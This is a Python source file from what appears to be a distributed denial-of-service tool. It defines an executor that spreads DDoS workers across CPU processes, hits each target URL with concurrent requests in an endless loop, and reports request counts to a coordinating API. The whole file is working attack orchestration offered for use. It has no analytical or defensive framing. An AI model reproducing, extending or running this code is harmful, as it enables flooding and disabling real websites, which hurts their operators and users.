import sys
from multiprocessing import Pool, Manager, cpu_count

from termcolor import cprint, colored

from src.api_client import ApiClient
from src.ddos_worker import DdosWorker


class DdosPoolProcessExecutor:
    def __init__(self, urls: list[str], threads_count: int, api_instance: ApiClient):
        manager = Manager()
        self._api_instance = api_instance
        self._threads_count = threads_count
        self._executed_results = manager.dict({url: 0 for url in urls})

        self._processes_count = cpu_count() - 1 or 1
        self._workers = [DdosWorker(url) for url in urls]

    def start(self):
        cprint(f'[*] Start DDOS on {self._processes_count} CPUs', 'cyan')

        try:
            with Pool(self._processes_count) as pool:
                pool.map(self._start_single_process, self._workers)
        except KeyboardInterrupt:
            sys.exit(cprint('\n[-] Canceled by user', 'red'))
        except Exception as e:
            sys.exit(cprint(f'\n[-] Something failed, exiting... {e}', 'red'))
        finally:
            cprint(f'\n[*] Submitting stats...', 'cyan')
            self._api_instance.submit_progress(self._processes_count, self._executed_results)
            cprint('[*] Successfully submitted requests stats', 'green')

    def _start_single_process(self, worker: DdosWorker):
        print(f'Started {worker.target}')
        while True:
            success_count = worker.run_concurrent(self._threads_count)
            self._executed_results[worker.target] += success_count
            self._print_executed_results()

    def _print_executed_results(self):
        print('\r', end='')
        for i, (url, count) in enumerate(self._executed_results.items()):
            print(f'{url}: {colored(count, "green")} requests', end='; ')
